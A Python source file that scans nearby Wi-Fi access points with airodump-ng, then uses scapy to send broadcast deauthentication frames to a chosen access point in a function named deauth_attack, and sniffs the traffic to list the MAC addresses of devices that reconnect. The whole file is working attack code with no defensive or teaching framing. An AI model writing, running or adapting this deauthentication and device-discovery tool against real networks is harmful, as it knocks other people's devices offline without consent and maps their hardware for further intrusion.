from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff
from interface_func import monitor_mode, managed_mode, set_channel
import subprocess
import time


# Returns a list containing every MAC address of every access point (AP) detected and its channel
def scan_access_points(interface):

    monitor_mode(interface)
    print("Scanning for access points....")
    try:
        AP_MAC_addr = []
        airodump_process = subprocess.Popen(["sudo", "airodump-ng", "--output-format", "csv", "-w", "output", interface+"mon"],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)

        # Wait for some time to capture access point data
        time.sleep(30)

        # Terminate airodump-ng process
        airodump_process.terminate()

        # Parse the csv file
        with open("output-01.csv", "r") as csvfile:
            lines = csvfile.readlines()
            for line in lines[2:]:  # Skip the header
                parts = line.strip().split(',')

                # Stop at the end of the AP addresses in the CSV file
                if len(parts) < 15:
                    break
                bssid = parts[0].strip()
                channel = parts[3].strip()
                AP_MAC_addr.append((bssid,channel))
                
    except subprocess.CalledProcessError as e:
        print("Error scanning:", e)
        exit(1)


    # Delete the airmon-ng csv file
    try:
        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error deleting csv file")
        exit(1)

    managed_mode(interface)
    return AP_MAC_addr


# Function that sends deauth packets to all the devices of the AP_MAC_address 
def deauth_attack(AP_MAC_address, channel, interface):

    # Change the channel of the wifi interface in monitor mode (needed for deauth attacks)
    set_channel(interface, channel)

    frame = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=AP_MAC_address, addr3=AP_MAC_address) / Dot11Deauth(reason=7)

    sendp(frame,inter=0.1, count=50, iface=interface + "mon", verbose=1)

    
def monitor(AP_MAC_address, interface):

    ap_address = AP_MAC_address.lower()
    device_addr = []

    def packet_handler(packet):
        if Dot11 in packet:
            wifi_packet = packet[Dot11]

            boradcast_address = "ff:ff:ff:ff:ff:ff"
            if(wifi_packet.addr1 != ap_address and wifi_packet.addr1 not in device_addr and wifi_packet.addr1 != boradcast_address):
                device_addr.append(wifi_packet.addr1)
            if(wifi_packet.addr2 != ap_address and wifi_packet.addr2 not in device_addr and wifi_packet.addr2 != boradcast_address):
                device_addr.append(wifi_packet.addr2)
            if(wifi_packet.addr3 != ap_address and wifi_packet.addr3 not in device_addr and wifi_packet.addr3 != boradcast_address):
                device_addr.append(wifi_packet.addr3)
            
    
    capture_filter = f"wlan host {ap_address}"

    sniff(iface=interface + "mon", filter=capture_filter, prn=packet_handler, timeout=30)
    
    return device_addr




# Returns a list containing all the devices connected to a specific access point address
def scan_devices(AP_MAC_address, channel, interface):

    monitor_mode(interface)

    print("Scanning devices for the access point: " + AP_MAC_address)
    # First deauthenticate all the devices of the access point mac address
    deauth_attack(AP_MAC_address,channel, interface)
    # Then monitor to see who reconnects
    devices = monitor(AP_MAC_address, interface)

    managed_mode(interface)
    return devices